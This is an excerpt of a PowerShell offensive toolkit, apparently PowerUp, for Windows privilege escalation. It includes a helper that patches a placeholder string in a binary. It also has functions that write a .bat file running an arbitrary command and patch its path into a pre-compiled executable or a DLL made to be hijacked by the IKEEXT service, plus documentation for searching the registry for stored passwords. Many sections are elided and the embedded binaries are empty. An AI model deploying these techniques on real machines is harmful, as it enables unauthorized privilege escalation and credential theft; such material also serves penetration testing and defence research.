...
function Invoke-PatchBinary {
<#
.SYNOPSIS

Helper that patches a string in a binary byte array.
...
#>
    ...
    $Index = 0
    $S = [System.Text.Encoding]::ASCII.GetString($BinaryBlob)
    ...
    for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++) {
        $BinaryBlob[$Index+$i]=$ReplaceStringBytes[$i]
    }
    $BinaryBlob[$Index+$ReplaceStringBytes.Length]=0
...
First builds a .bat file that executes the specified -Command and writes the .bat out to
-BatPath. The BatPath is then patched into a pre-compiled C++ executable. There are two
executables, one for x86 and one for x64, and both are contained
as base64-encoded strings. The exe is then written out to the specified -Path.
...
The Architecture to generate for the exe, x86 or x64. If not specified, PowerUp
will try to automatically determine the correct architecture.

.PARAMETER BatPath

Path to the .bat for the exe to launch.
...
#>
    ...
    $ExeBytes32 = ""
    $ExeBytes64 = ""
    ...
    if ($TargetArchitecture -eq 'x64') {
        [Byte[]]$ExeBytes = [Byte[]][Convert]::FromBase64String($ExeBytes64)
    }
    else {
        [Byte[]]$ExeBytes = [Byte[]][Convert]::FromBase64String($ExeBytes32)
    }
    ...
    if ($PSBoundParameters['BatPath']) {
        ...
        $BasePath = $Path | Split-Path -Parent | Resolve-Path | Select-Object -ExpandProperty Path
        $TargetBatPath = "$BasePath\debug.bat"
    }

    $ExeBytes = Invoke-PatchBinary -BinaryBlob $ExeBytes -SearchString 'REPLACEMEPLS:)' -ReplaceString $TargetBatPath

    if (Test-Path $TargetBatPath) { Remove-Item -Force $TargetBatPath }
    "$BatCommand" | Out-File -Encoding ASCII -Append $TargetBatPath

    Write-Verbose ".bat launcher written to: $TargetBatPath"
    Set-Content -Value $ExeBytes -Encoding Byte -Path $Path
    Write-Verbose "$TargetArchitecture exe written to: $Path"

    $Out = New-Object PSObject
    $Out | Add-Member Noteproperty 'ExePath' $Path
...
First builds a .bat file that executes the specified -Command and writes the .bat out to
-BatPath. The BatPath is then patched into a pre-compiled C++ DLL that is built to be hijackable
by the IKEEXT service. There are two DLLs, one for x86 and one for x64, and both are contained
as base64-encoded strings. The DLL is then written out to the specified -DllPath.
...
#>
    ...
    $DllBytes32 = ""
    $DllBytes64 = ""
    ...
    if ($PSBoundParameters['BatPath']) {
        ...
        $BasePath = $DllPath | Split-Path -Parent | Resolve-Path | Select-Object -ExpandProperty Path
        $TargetBatPath = "$BasePath\debug.bat"
    }

    $DllBytes = Invoke-PatchBinary -BinaryBlob $DllBytes -SearchString 'REPLACEMEPLS:)' -ReplaceString $TargetBatPath
...
It is common for software to store passwords inside the registry. Some of these locations are well
known and can be enumerated with Get-KnownRegistryPasswords. Others are not well known and need to
be searched by enumerating all available keys.

.PARAMETER IncludeMs

Switch. Includes all registry keys that most likely belong to Microsoft (e.g. \Microsoft, \Classes)
